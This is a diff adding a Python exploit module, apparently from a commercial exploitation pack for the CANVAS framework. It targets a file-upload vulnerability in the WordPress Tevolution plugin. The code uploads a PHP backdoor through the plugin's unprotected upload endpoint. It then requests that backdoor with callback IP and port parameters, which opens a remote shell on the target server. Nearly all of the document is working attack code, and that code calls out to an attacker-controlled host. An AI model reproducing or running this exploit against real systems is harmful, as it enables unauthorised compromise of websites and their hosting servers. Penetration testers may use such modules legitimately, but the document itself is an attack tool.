@@ -1,0 +1,134 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2016
+#
+
+import sys
+import time
+import os
+import random
+import base64
+import io
+import zipfile
+
+from urllib import urlopen
+from sgmllib import SGMLParser
+
+sys.path.append(".")
+sys.path.append("../../")
+
+import canvasengine
+import libs.spkproxy as spkproxy
+
+from exploitutils import *
+from tcpexploit import tcpexploit
+
+
+# GUI info
+NAME = "WordPress Tevolution File Upload Vulnerability"
+
+DESCRIPTION = "File upload vulnerability in WordPress Tevolution plugin"
+
+DOCUMENTATION = {}
+DOCUMENTATION["VENDOR"] = "Templatic"
+DOCUMENTATION["Repeatability"] = "Infinite"
+DOCUMENTATION["Versions Affected"] = "Tevolution <= 2.2.7"
+DOCUMENTATION["Date public"] = "2016.05.03"
+DOCUMENTATION["References"] = "https://templatic.com/news/security-vulnerability-found-themes/"
+DOCUMENTATION["CERT Advisory"] = ""
+DOCUMENTATION["CVE Name"] = "Unknown"
+DOCUMENTATION["CVE Url"] = "Unknown"
+DOCUMENTATION["Notes"] = ""
+
+VERSION = '1.0'
+
+GTK2_DIALOG = 'dialog.glade2'
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Web Exploits"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["All"] ]
+
+NOTES="""
+Start converttomosdef to get a MOSDEF node from the PHP node.
+"""
+
+CHANGELOG="""
+"""
+
+
+class theexploit (tcpexploit):
+    
+  def __init__(self):
+    tcpexploit.__init__(self)
+    self.host = ""    
+    self.filename = "backdoors/php_callback.php"        
+    self.basepath = "/"    
+    self.protocol = "http"
+    self.port = 80
+    self.sslport = 443
+    self.https = 1
+    self.name = NAME
+    return
+
+  def neededListenerTypes(self):
+    return [canvasengine.PHPMULTI]
+	
+  def upload_file(self):                   
+    f = open(self.filename, "r")
+    fdata = f.read()
+    f.close()     
+
+    if self.https == 0:
+        self.protocol = "http"
+    else:
+        self.protocol = "https"
+        self.port = self.sslport
+    
+    ua = spkproxy.UserAgent("", exploit=self)
+ 
+    # Upload PHP file                  
+    url = '/wp-content/plugins/Tevolution/tmplconnector/monetize/templatic-custom_fields/single-upload.php'        
+    mainurl = "%s://%s:%d/%s%s" % (self.protocol, self.host, self.port, self.basepath, url)
+    ua.addHeader("User-Agent", "Mozilla/5.0 (X11; Linux x86_64; rv:7.0.1) Gecko/20100101 Firefox/7.0.1")   
+    ua.addHeader("Content-Type", "multipart/form-data; boundary=----OZzgyCs6T1f3dVK")         
+        
+    params = '------OZzgyCs6T1f3dVK\r\nContent-Disposition: form-data; name="files[]"; filename="d2.php"\r\nContent-Type: application/octet-stream\r\nContent-Length: %d\r\n\r\n%s\r\n------OZzgyCs6T1f3dVK--'%(len(fdata), fdata)            
+    buff = ua.POST(mainurl, params)
+
+    # Execute uploaded PHP file
+    url = "/wp-content/themes/twentytwelve/images/tmp/d2.php?cb_ip=%s&cb_port=%s"%(self.callback.ip, self.callback.port)
+    mainurl = "%s://%s:%d/%s%s" % (self.protocol, self.host, self.port, self.basepath, url)
+    buff = ua.GET(mainurl)    
+                		
+    return 1
+
+  def getargs(self):	
+    self.host = self.target.interface
+    self.port = int(self.argsDict.get("port", self.port))
+    self.sslport = int(self.argsDict.get("sslport", self.sslport))
+    self.https = int(self.argsDict.get("https", self.https))
+    self.basepath = self.argsDict.get("basepath", self.basepath)     
+
+  def run(self):
+    self.getargs()
+    self.setInfo("%s attacking %s"%(NAME,self.host))
+ 
+    ret = self.upload_file()
+    
+    self.setInfo("%s attacking %s - done"%(NAME, self.host))
+    
+    return ret
+
+  def usage(self):
+    print "Usage: " + sys.argv[0] + " -t target -p port -O https:[0|1]"
+    sys.exit(0)
+    
+if __name__ == '__main__':
+  print "Running CANVAS %s v %s" % (NAME, VERSION)
+  app = theexploit()
+  ret = standard_callback_commandline(app)
